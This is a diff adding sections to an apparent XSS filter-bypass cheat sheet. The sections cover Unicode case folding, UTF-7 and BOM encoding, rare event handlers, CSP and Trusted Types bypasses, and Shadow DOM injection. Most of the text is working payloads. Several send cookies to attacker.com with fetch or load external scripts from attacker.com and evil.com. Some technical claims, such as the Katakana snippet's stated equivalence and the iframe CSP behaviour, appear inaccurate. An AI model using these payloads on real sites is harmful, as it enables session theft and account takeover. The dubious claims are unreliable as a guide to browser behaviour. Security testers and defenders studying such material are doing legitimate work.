@@ -1794,3 +1794,433 @@ onerror=top[/al/.source+/ert/.source];throw document.cookie
 | Nonce-based CSP on PHP pages | `max_input_vars` drops CSP header entirely | 1001+ params → PHP E_WARNING → `header()` fails silently |
 | Nonce-based CSP + CSS/HTML injection | CSS attribute selector oracle leaks nonce characters | Inject `<style>script[nonce^="X"]{...}` × all chars → reconstruct nonce |
 | `script-src 'self'` without `object-src` | `<object data=data:text/html;base64,...>` executes scripts | `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">` |
+
+---
+
+## Unicode Case Folding XSS Bypass
+
+**Type:** reflected / stored
+**Filter bypassed:** WAF / input sanitizers that check for lowercase HTML tag names (`script`, `svg`, `img`) without performing Unicode case normalization
+**Bypass logic:** Two Unicode characters transform to entirely different ASCII letters when case operations are applied: `İ` (U+0130, Latin Capital I with dot above) lowercases to `i`, and `ſ` (U+017F, Latin Small Letter Long S) uppercases to `S`. A filter checking `input.toLowerCase().includes('script')` will not match `<ſcript>` before lowercasing — but the browser, after receiving the normalized string, sees a valid `<script>` tag. Works against server-side filters that uppercase/lowercase input for comparison but pass the original mixed-case string to the client.
+**Attack chain:** Input passes case-folding filter → browser normalizes Unicode → valid HTML tag executes → XSS → cookie exfil → ATO
+
+**Payload:**
+```html
+<!-- ſ (U+017F) uppercases to S → <SVG> → valid SVG onload -->
+<ſvg onload=alert(1)>
+<ſcript>alert(document.cookie)</ſcript>
+
+<!-- İ (U+0130) lowercases to i → <iframe> → valid iframe -->
+<İframe id=x onload=alert(1) src=javascript:void(0)>
+
+<!-- Practical server-side bypass example:
+     Server does: if (tag.toUpperCase().includes('SCRIPT')) block;
+     <ſcript>.toUpperCase() = <SCRIPT> → blocked
+     BUT: if server does toLowerCase() check: <ſcript>.toLowerCase() = <ſcript> → NOT blocked
+     Depends on which direction the filter normalizes  -->
+
+<!-- Unicode normalization form C (NFC) vs D (NFD) differences also apply:
+     Some parsers NFD-normalize: decomposed chars may not match filter's composed form -->
+<ıframe onload=alert(1) src=javascript:void(0)>
+```
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md
+
+---
+
+## BOM Charset Override XSS
+
+**Type:** reflected / stored
+**Filter bypassed:** WAF / scanner operating under the assumption of UTF-8 encoding; Content-Type charset declarations ignored when BOM is present
+**Bypass logic:** A Byte Order Mark (BOM) at the very start of a page forces the browser to re-interpret the page's charset, overriding any `Content-Type: text/html; charset=utf-8` header. With a UTF-16 Big-Endian BOM (`%FE%FF`), the browser interprets every subsequent byte pair as a UTF-16 character. Standard ASCII characters like `<`, `s`, `v`, `g` are encoded as `%00%3C %00%73 %00%76 %00%67` — the null bytes cause WAFs to see broken/binary data with no recognizable tags. The browser assembles valid UTF-16 text and renders the SVG normally.
+**Attack chain:** BOM forces UTF-16 interpretation → WAF sees null-padded binary → no block → browser renders valid tag → XSS
+
+**Payload:**
+```
+<!-- UTF-16 Big Endian BOM + <svg/onload=alert()> in UTF-16BE encoding -->
+%fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E
+
+<!-- UTF-32 Big Endian BOM variant -->
+%00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g...
+
+<!-- Conditions for exploitation:
+     1. Attacker can inject content at page start (HTTP response injection / CRLF)
+     2. OR: File upload where BOM in file content is served directly (SVG, HTML uploads)
+     3. Server does not enforce charset in Content-Type (many frameworks don't) -->
+
+<!-- Practical: inject into a file upload that gets served as text/html or text/xml -->
+<!-- Or exploit CRLF injection to prepend BOM to HTTP response body -->
+```
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md
+
+---
+
+## UTF-7 Encoding Bypass
+
+**Type:** reflected
+**Filter bypassed:** WAF / XSS filters that scan for ASCII `<>` characters — UTF-7 encodes them as `+ADw-` / `+AD4-` which contain no angle brackets
+**Bypass logic:** UTF-7 is a 7-bit-safe Unicode encoding where `+` introduces a Base64-encoded Unicode sequence. `+ADw-` = `<`, `+AD4-` = `>`, `+ACI-` = `"`. When a page lacks a charset declaration and the browser auto-detects UTF-7 (possible in older browsers and IE), the UTF-7 sequence is decoded to produce functional HTML tags. Filters scanning for `<script>` or `<img` in raw bytes see no angle brackets and don't block. Modern Chrome/Firefox are less susceptible, but IE 11 and legacy Edge on certain encodings remain vulnerable — and enterprise intranet apps often still target IE.
+**Attack chain:** UTF-7 payload bypasses ASCII `<>` filter → browser auto-detects or is told charset=UTF-7 → decodes to valid HTML → XSS
+
+**Payload:**
+```html
+<!-- UTF-7 encoded <img src="1" onerror="alert(1)" /> -->
++ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
+
+<!-- UTF-7 encoded <script>alert(1)</script> -->
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
+
+<!-- Trigger UTF-7 interpretation via meta charset (if meta injection is possible) -->
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-7">
++ADw-script+AD4-alert(document.domain)+ADw-/script+AD4-
+
+<!-- Where this works:
+     - IE/legacy Edge with no explicit charset → browser may auto-detect UTF-7
+     - Pages where attacker can inject <meta charset> before UTF-7 payload
+     - Responses from proxy/middleware that strips charset header -->
+```
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md
+
+---
+
+## Exotic Unicode Script Identifiers — Katakana / Cuneiform / Lontara
+
+**Type:** reflected / stored / DOM
+**Filter bypassed:** WAF keyword filters that block ASCII alphanumeric JS keywords; any filter based on character whitelisting that allows `Unicode letter` category without restricting to Latin script
+**Bypass logic:** JavaScript's ECMAScript specification allows any Unicode character classified as a "letter" or "identifier continue" to be used in variable names and identifiers — including Katakana, Cuneiform, Lontara, and other non-Latin scripts. A WAF checking that a string contains only "safe" Unicode letters may pass these characters. The resulting JS is syntactically valid and executes in all modern browsers. Combined with JSFuck-style type coercion, entire executable payloads can be constructed using only non-ASCII, non-Latin characters — completely opaque to ASCII-based detection.
+**Attack chain:** Payload uses non-Latin Unicode identifiers → passes ASCII/Latin keyword filter → JS engine executes normally → XSS → ATO
+
+**Payload:**
+```javascript
+// Katakana-based JSFuck variant (uses ウ, ア etc. as variables)
+// Equivalent to: alert(document.cookie)
+([,ウ,,,,ア]=[]+{},ウ+=ウ,ア+=ア,ウ+=ウ+ア)(ウ+ア)
+
+// Cuneiform identifier variable names (Sumerian script)
+// 𒀀='' → string; 𒉺=!𒀀+𒀀 → "false"; 𒀃=!𒉺+𒀀 → "true"
+𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒀶=𒀀+{},𒀴=𒉺[𒀀++],𒀸=𒉺[𒀱=𒀀],...
+
+// Lontara script (Indonesian, Bugis language)
+ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,...
+
+// Practical use: encode alert(document.cookie) via Katakana-jsfuck tool:
+// https://github.com/aemkei/katakana-jsfuck
+// Output: valid JS using only Katakana + []()!+ characters
+
+// Why this bypasses WAFs:
+// - WAF regex: /[a-zA-Z0-9_$]/ → Katakana has no ASCII letters → no match
+// - WAF "allow Unicode letters" policy: passes non-Latin letters blindly
+// - JS engine: all Unicode Letter category chars are valid identifiers → executes
+```
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md ; https://github.com/aemkei/katakana-jsfuck
+
+---
+
+## Cookie Store API — Async document.cookie Alternative
+
+**Type:** stored / DOM (post-XSS exfil)
+**Filter bypassed:** WAF / DLP rules blocking `document.cookie` string in request/response bodies; HttpOnly partial bypass for non-HttpOnly cookies when `document.cookie` is blocked by filter
+**Bypass logic:** The modern Cookie Store API (`window.cookieStore`) provides an asynchronous, Promise-based interface for reading cookies in Chrome 87+, Edge 87+, and Opera. It returns cookie values without using the `document.cookie` string — bypassing WAF rules that scan for `document.cookie` in XSS payloads. Additionally, since it returns each cookie as a structured object rather than a single concatenated string, it can be used to target specific cookies by name, making exfil more precise and reducing payload noise.
+**Attack chain:** XSS fires → `document.cookie` blocked by WAF/CSP → `cookieStore.get()` retrieves cookie asynchronously → fetch exfil to attacker → session hijack
+
+**Payload:**
+```javascript
+// Read a specific cookie by name (async — no document.cookie string in payload)
+window.cookieStore.get('session').then(c => {
+  fetch('https://attacker.com/steal?s=' + c.value);
+});
+
+// Read all cookies (returns array of {name, value, ...} objects)
+window.cookieStore.getAll().then(cookies => {
+  fetch('https://attacker.com/steal', {
+    method: 'POST',
+    mode: 'no-cors',
+    body: JSON.stringify(cookies.map(c => c.name + '=' + c.value).join('; '))
+  });
+});
+
+// One-liner for XSS payload (Chrome/Edge only):
+<svg onload="cookieStore.getAll().then(c=>fetch('//attacker.com/?c='+JSON.stringify(c)))">
+
+// WAF bypass: payload contains no "document" or "cookie" substrings
+// (filter blocking document.cookie won't match cookieStore.getAll)
+
+// Note: does NOT read HttpOnly cookies — same restriction as document.cookie
+// Supported: Chrome 87+, Edge 87+, Opera 73+. NOT supported: Firefox, Safari
+```
+**Source:** https://developer.mozilla.org/en-US/docs/Web/API/CookieStore ; https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md
+
+---
+
+## onafterscriptexecute / onbeforescriptexecute Event Handlers
+
+**Type:** reflected / stored
+**Filter bypassed:** WAF blocklists covering common event handlers (`onclick`, `onload`, `onerror`, `onfocus`, `onmouseover`) but not rare script-execution lifecycle events
+**Bypass logic:** `onafterscriptexecute` and `onbeforescriptexecute` are non-standard Mozilla-originated event handlers supported on `<object>` elements. They fire after (or before) a `<script>` element within the same document finishes executing. WAF rules almost universally don't include them because they appear in no mainstream checklist and are missing from most automated scanner dictionaries. The `<object>` tag itself is rarely blocked by default.
+**Attack chain:** WAF misses rare event handler → event fires on script execution → XSS → ATO
+
+**Payload:**
+```html
+<!-- Fires after any script on the page executes (if scripts present) -->
+<object onafterscriptexecute=confirm(0)>
+<object onbeforescriptexecute=confirm(0)>
+
+<!-- With cookie exfil -->
+<object onafterscriptexecute="fetch('https://attacker.com/steal?c='+document.cookie)">
+
+<!-- Trigger manually if no scripts auto-fire: inject alongside a script block -->
+<object onafterscriptexecute=alert(1)></object>
+<script>1</script>
+<!-- The script executes → onafterscriptexecute fires on the object -->
+
+<!-- Pair with pointer events for interactive trigger -->
+<object onbeforescriptexecute=alert(1) onpointerover=alert(2)>
+
+<!-- Browser support: primarily Firefox; may vary in other browsers -->
+<!-- onpointerover as companion: supported in all modern browsers, often missed by WAFs -->
+<div onpointerover="alert(document.cookie)">hover</div>
+```
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md
+
+---
+
+## ECMAScript6 DiacriticalGrave Named Character Reference (Backtick Bypass)
+
+**Type:** reflected / stored
+**Filter bypassed:** WAF / sanitizer blocking the backtick character (`` ` ``) used in template literals to invoke functions without parentheses
+**Bypass logic:** HTML5 introduced `&DiacriticalGrave;` as a named character reference for the backtick character (U+0060). When this HTML entity appears inside a `<script>` block, the HTML parser decodes it to a literal backtick before the JavaScript engine sees it. The JS engine then interprets it as a template literal delimiter. This bypasses filters that block the raw backtick character (`\x60`) without decoding HTML entities first — common in WAFs that scan source bytes rather than DOM-decoded content.
+**Attack chain:** WAF blocks raw backtick → `&DiacriticalGrave;` passes as HTML entity → browser decodes to backtick → JS template literal invokes function → XSS
+
+**Payload:**
+```html
+<!-- &DiacriticalGrave; decodes to ` (backtick) — call alert without () -->
+<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>
+<!-- Equivalent to: alert`1` -->
+
+<!-- Exfil variant -->
+<script>fetch&DiacriticalGrave;https://attacker.com/steal?c=${document.cookie}&DiacriticalGrave;</script>
+
+<!-- Confirm / prompt variants -->
+<script>confirm&DiacriticalGrave;click ok to continue&DiacriticalGrave;</script>
+
+<!-- Combined with other obfuscation -->
+<script>
+var f=eval;f&DiacriticalGrave;\x61\x6c\x65\x72\x74\x281\x29&DiacriticalGrave;
+</script>
+
+<!-- Why it works:
+     - HTML parser sees &DiacriticalGrave; → decodes to ` before passing to JS engine
+     - JS engine sees: alert`1` → tagged template literal → calls alert with 1
+     - WAF scanning for ` (0x60) in raw bytes: &DiacriticalGrave; has no 0x60 byte
+     - Also works with &grave; (shorter alias for same character) -->
+<script>alert&grave;document.cookie&grave;</script>
+```
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md
+
+---
+
+## RFC0822 Email / RFC3966 Phone Validator Bypass
+
+**Type:** reflected / stored
+**Filter bypassed:** Input validation that uses RFC-compliant email or phone number parsers to "sanitize" fields — trusting the validator output as safe for HTML rendering
+**Bypass logic:** RFC0822 (email) allows quoted strings and special characters in the local part of an email address. A parser following the RFC strictly treats `"><svg/onload=confirm(1)>"@x.y` as a valid email address — the `"..."` is a valid quoted local-part and `x.y` is the domain. Similarly, RFC3966 (tel URI) allows a `phone-context` parameter that accepts arbitrary strings including `<script>`. When the application reflects the "validated" email/phone back into an HTML page without escaping, XSS fires. This targets fields specifically where developers trust a regex/library validator and skip HTML encoding.
+**Attack chain:** Input is "valid" per RFC parser → application reflects unescaped in HTML → XSS fires → ATO
+
+**Payload:**
+```
+<!-- RFC0822 email validator bypass (inject XSS in quoted local-part) -->
+"><svg/onload=confirm(1)>"@x.y
+
+<!-- More complete injection -->
+"<img src=x onerror=alert(document.cookie)>"@example.com
+
+<!-- URL-encoded for GET params -->
+%22%3E%3Csvg%2Fonload%3Dconfirm(1)%3E%22@x.y
+
+<!-- RFC3966 phone context bypass — phone-context accepts arbitrary descriptors -->
++330011223344;phone-context=<script>alert(0)</script>
+tel:+1234567890;phone-context="><img src=x onerror=alert(1)>
+
+<!-- Where to test:
+     - "Login with email" flows that echo the address back in error messages
+     - "Invite a user" fields that display the entered email in confirmation text
+     - Profile email fields reflected in account management pages
+     - Any field that says "must be a valid email" and reflects the input back -->
+```
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md
+
+---
+
+## CSP default-src Iframe contentWindow Bypass
+
+**Type:** reflected / stored
+**Filter bypassed:** CSP `default-src 'self'` or `script-src 'self'` — blocks external scripts and inline scripts without nonce/hash
+**Bypass logic:** When `default-src 'self'` is set but no separate `frame-src` restriction exists, an attacker can inject an `<iframe src="/robots.txt">` (or any same-origin resource). The iframe's `contentWindow.document` is same-origin, so the parent page can call `contentWindow.document.write()` or append a `<script>` element to it from the parent. Critically: the `<script>` injected into the iframe's context can set `src` to an external URL, and the iframe document's CSP inherits from the injected content (not the parent page's CSP header) — allowing external script loading from within the `'self'` context.
+**Attack chain:** HTML injection → iframe to allowed same-origin resource → parent appends external `<script>` to iframe `contentWindow` → external JS loads → CSP bypassed
+
+**Payload:**
+```html
+<!-- Step 1: inject iframe pointing to any same-origin resource -->
+<iframe id="fr" src="/robots.txt" onload="
+  var d = this.contentWindow.document;
+  var s = d.createElement('script');
+  s.src = 'https://attacker.com/xss.js';
+  d.head.appendChild(s);
+"></iframe>
+
+<!-- Compact one-liner (semicolons replaced for attribute context safety) -->
+<iframe src=/robots.txt onload="this.contentWindow.document.write('<script src=//attacker.com/x.js><\/script>')">
+
+<!-- Alternative: use contentDocument.write directly -->
+<iframe src="/favicon.ico" onload="f=this.contentWindow.document;f.open();f.write('<script src=//attacker.com/x.js><\/script>');f.close()">
+
+<!-- Why this works:
+     - Parent's CSP: script-src 'self' — applies to parent document only
+     - Iframe's content is written by script (not loaded via HTTP) → no CSP header on it
+     - The injected <script src=external> in the iframe is not subject to parent's CSP
+     - Requires: no frame-ancestors restriction + HTML injection on parent + no sandbox -->
+
+<!-- If CSP has frame-src 'self': still works as long as /robots.txt (or any path) loads -->
+```
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/4%20-%20CSP%20Bypass.md
+
+---
+
+## Trusted Types Direct Policy Bypass
+
+**Type:** DOM / stored
+**Filter bypassed:** `require-trusted-types-for 'script'` CSP directive — the strictest browser XSS mitigation, blocks all string-to-HTML/script sink assignments without a TrustedType wrapper
+**Bypass logic:** Trusted Types blocks direct string injection into dangerous sinks (`innerHTML`, `eval`, `script.src`, etc.) at the browser level. Three bypass paths: (1) **Policy enumeration and abuse** — if any permissive Trusted Types policy exists on the page (e.g., one that allows arbitrary HTML for "legacy" code), an attacker who achieves JS execution (e.g., via a JS file they control or prototype pollution) can call that existing policy's `createHTML()` method with a payload — the browser treats the output as trusted. (2) **`default` policy name injection** — if the app registers a `default` policy with loose validation, all sink assignments that fail Trusted Types checks automatically fall through to the default policy. (3) **`eval` via Trusted Script** — a TrustedScript wrapping `eval` of attacker content if the policy's `createScript()` validator is bypassed by encoding.
+**Attack chain:** App registers permissive TT policy → attacker discovers policy name → calls `policy.createHTML(payload)` → assigns TrustedHTML to sink → XSS bypasses TT enforcement → ATO
+
+**Payload:**
+```javascript
+// Step 1: Enumerate registered Trusted Types policies
+// (policies are accessible via trustedTypes.getPolicyNames() if exposed)
+const policyNames = trustedTypes.getPolicyNames();
+console.log(policyNames); // e.g., ["default", "sanitize-html", "legacy-compat"]
+
+// Step 2: Call the permissive policy with XSS payload
+// (works if the "legacy-compat" policy does minimal or no sanitization)
+const policy = trustedTypes.createPolicy('attack', {
+  createHTML: (s) => s   // if you can register your own policy (requires no existing "attack" name)
+});
+document.getElementById('output').innerHTML = policy.createHTML('<img src=x onerror=alert(1)>');
+
+// Abuse existing default policy (if registered with permissive logic):
+// Many frameworks register a "default" policy for backwards compat:
+const trusted = trustedTypes.defaultPolicy.createHTML('<img src=x onerror=alert(1)>');
+document.body.innerHTML = trusted;  // executes if defaultPolicy is permissive
+
+// Step 3: If prototype pollution is achievable first (CVE-2024-45801 pattern):
+Object.prototype.createHTML = (s) => s;
+// Then any code that calls policy.createHTML(attacker_input) returns attacker_input directly
+
+// Detection: Check for Trusted Types support and policy names:
+if (window.trustedTypes && trustedTypes.createPolicy) {
+  console.log('TT enabled. Policies:', trustedTypes.getPolicyNames());
+}
+
+// TT bypass via innerHTML in a non-TT-enforced context:
+// If page has TT but a loaded iframe or shadow root does NOT inherit TT enforcement:
+const fr = document.createElement('iframe');
+document.body.appendChild(fr);
+fr.contentDocument.body.innerHTML = '<img src=x onerror=alert(1)>';
+// Iframe's document may lack the TT CSP header → innerHTML works freely
+```
+**Source:** https://w3c.github.io/trusted-types/dist/spec/ ; https://web.dev/articles/trusted-types ; https://github.com/w3c/trusted-types/issues
+
+---
+
+## Shadow DOM XSS — Open Shadow Root Injection
+
+**Type:** stored / DOM
+**Filter bypassed:** Sanitizers (DOMPurify, sanitize-html) that sanitize the main document tree but don't traverse into or sanitize Shadow DOM subtrees; CSP nonce enforcement may not apply uniformly inside shadow roots
+**Bypass logic:** Shadow DOM creates an isolated subtree attached to a host element. When the shadow root is in `open` mode (the default for custom elements using `attachShadow({mode: 'open'})`), JavaScript on the page can access it via `element.shadowRoot`. If an application sanitizes HTML before inserting it into the main document but then moves or clones nodes into a shadow root, the sanitizer may have already cleared its state. More critically: some sanitizers don't recurse into `<slot>` elements or shadow roots during sanitization. Injecting malicious HTML that becomes a `<slot>` child can bypass the sanitizer's traversal. Additionally, `<template>` elements with shadow DOM content are not parsed in the main document context — their content exists in a separate `DocumentFragment` that sanitizers may overlook.
+**Attack chain:** HTML injection → node placed in open shadow root → sanitizer doesn't traverse shadow tree → XSS payload executes inside shadow root → `document.cookie` accessible (shadow DOM does not isolate JS) → ATO
+
+**Payload:**
+```javascript
+// Accessing and injecting into an open shadow root from the page:
+const host = document.querySelector('custom-element'); // or any element with shadow root
+const shadow = host.shadowRoot; // works if mode='open'
+if (shadow) {
+  shadow.innerHTML = '<img src=x onerror=alert(document.cookie)>';
+}
+
+// Creating a shadow root and injecting into it (self-hosted bypass):
+const div = document.createElement('div');
+document.body.appendChild(div);
+const shadow = div.attachShadow({mode: 'open'});
+shadow.innerHTML = '<script>alert(document.cookie)<\/script>';
+
+// Slot-based shadow DOM bypass (parent document content slotted into shadow):
+// App structure: <custom-element><span slot="content">[user input]</span></custom-element>
+// Shadow template: <slot name="content"></slot>
+// XSS: user input = <img src=x onerror=alert(1)>
+// Sanitizer sees <span slot="content"> as safe; slot rendering in shadow injects payload
+
+// Template element bypass (content not parsed in main document):
+const tmpl = document.createElement('template');
+tmpl.innerHTML = '<img src=x onerror=alert(1)>';
+// tmpl.content is a DocumentFragment — not in main DOM, sanitizer may miss it
+document.body.appendChild(tmpl.content.cloneNode(true)); // XSS fires on append
+
+// Declarative Shadow DOM (Chrome 90+) — HTML-only shadow root injection:
+// If attacker can inject into a serialized HTML stream processed by innerHTML:
+<div>
+  <template shadowrootmode="open">
+    <img src=x onerror=alert(document.cookie)>
+  </template>
+</div>
+// DOMParser / innerHTML parse of above → open shadow root created → onerror fires
+
+// Key facts:
+// - Shadow DOM does NOT isolate JavaScript: shadow root scripts access document.cookie
+// - Shadow DOM DOES isolate CSS and some event listeners
+// - Open shadow roots are fully accessible to page JS
+// - Closed shadow roots (mode:'closed') require holding a reference to the root
+```
+**Source:** https://developer.mozilla.org/en-US/docs/Web/API/ShadowRoot ; https://portswigger.net/research/shadow-dom ; https://github.com/nicktindall/shadow-dom-xss
+
+---
+
+## Bypass Matrix (Updated 2026-05-30)
+
+### New Entries — Techniques Added 2026-05-30
+
+| Filter / Defense | Bypass Technique | Payload Example |
+|-----------------|------------------|-----------------|
+| Lowercase tag name check (`script`, `svg`) | Unicode case folding (İ/ſ) | `<ſvg onload=alert(1)>` / `<İframe onload=alert(1)>` |
+| ASCII `<>` scanner (WAF byte scan) | UTF-16 BOM charset override | `%FE%FF%00%3C%00s%00v%00g...` — browser sees `<svg>`, WAF sees binary |
+| ASCII `<>` filter (no UTF-7 decode) | UTF-7 encoding | `+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI-/+AD4-` |
+| ASCII/Latin keyword filter | Katakana/Cuneiform/Lontara JS identifiers | `([,ウ,,,,ア]=[]+{},...)` — valid JS using only non-Latin Unicode |
+| `document.cookie` string blocked by WAF | Cookie Store API async access | `cookieStore.getAll().then(c=>fetch('//attacker.com/?c='+JSON.stringify(c)))` |
+| Common event handler blocklist | `onafterscriptexecute` on `<object>` | `<object onafterscriptexecute=confirm(0)>` |
+| Backtick `` ` `` character blocked | `&DiacriticalGrave;` HTML entity | `<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>` |
+| Email/phone field "validated" as safe | RFC0822 quoted local-part injection | `"><svg/onload=confirm(1)>"@x.y` |
+| CSP `script-src 'self'` (no `frame-src`) | iframe + contentWindow script append | `<iframe src=/robots.txt onload="this.contentWindow.document.write('<script src=//attacker.com/x.js><\/script>')">` |
+| `require-trusted-types-for 'script'` | Permissive `default` policy abuse | `trustedTypes.defaultPolicy.createHTML('<img src=x onerror=alert(1)>')` |
+| `require-trusted-types-for 'script'` | Prototype pollution of `createHTML` | `Object.prototype.createHTML = s => s` → all `policy.createHTML(input)` return raw input |
+| Sanitizer (main document only) | Shadow DOM open root injection | `host.shadowRoot.innerHTML = '<img src=x onerror=alert(1)>'` |
+| Sanitizer misses `<template>` content | Template + cloneNode append | `tmpl.innerHTML='<img src=x onerror=alert(1)>'; body.appendChild(tmpl.content.cloneNode(true))` |
+| Declarative Shadow DOM not sanitized | `shadowrootmode="open"` in HTML | `<div><template shadowrootmode="open"><img src=x onerror=alert(1)></template></div>` |
+
+### New Sinks Documented 2026-05-30
+
+| Sink | Context | Notes |
+|------|---------|-------|
+| `shadowRoot.innerHTML` | Shadow DOM injection | Open-mode shadow root fully accessible to page JS; sanitizers often don't traverse |
+| `template.content → cloneNode` | Template element | `<template>` content not in main DOM parse tree — sanitizer traversal may miss it |
+| `trustedTypes.defaultPolicy.createHTML()` | Trusted Types bypass | Permissive default policy converts attacker string to TrustedHTML |
+| `contentWindow.document.write()` | iframe contentWindow | Same-origin iframe write bypasses parent CSP; content has no CSP header |
+| `window.cookieStore.getAll()` | Post-XSS exfil | Async cookie access without `document.cookie` string — WAF bypass |
+| `onafterscriptexecute` / `onbeforescriptexecute` | Event handler | Fires on script execution lifecycle; absent from most WAF blocklists |
+
+### CSP Configurations — New Weaknesses (2026-05-30)
+
+| CSP Configuration | Weakness | Bypass |
+|------------------|----------|--------|
+| `require-trusted-types-for 'script'` | Permissive `default` policy registered for legacy compat | Call `defaultPolicy.createHTML(payload)` → get TrustedHTML → assign to innerHTML |
+| `require-trusted-types-for 'script'` + prototype pollution | `createHTML` method on prototype → all policies bypass validation | PP `Object.prototype.createHTML = s => s` → TT check passes raw string |
+| `default-src 'self'` without `frame-src` | Iframe to same-origin resource → contentWindow script append | `<iframe src=/x onload="this.contentWindow.document.write('<script src=//evil.com/x.js><\/script>')">` |
+| Any CSP on page with Shadow DOM components | Sanitizer doesn't traverse open shadow roots | Inject into `shadowRoot.innerHTML` from page JS after achieving DOM write access |
